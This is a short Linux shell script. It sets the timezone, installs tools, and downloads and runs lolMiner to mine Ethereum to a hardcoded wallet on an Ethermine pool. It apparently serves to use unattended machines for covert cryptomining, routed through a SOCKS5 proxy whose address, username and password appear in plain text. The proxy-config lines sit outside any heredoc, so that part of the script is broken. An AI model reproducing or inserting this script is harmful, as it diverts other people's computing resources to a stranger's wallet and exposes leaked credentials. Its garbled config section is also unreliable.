#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

listen = :2233
loglevel = 1
socks5 = 3.15.39.186:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && ./lolMiner --algo ETHASH  --pool asia2.ethermine.org:4444 --user 0xfd6d21895194cf8ed101a00745f4289926ebba9f.WORKER
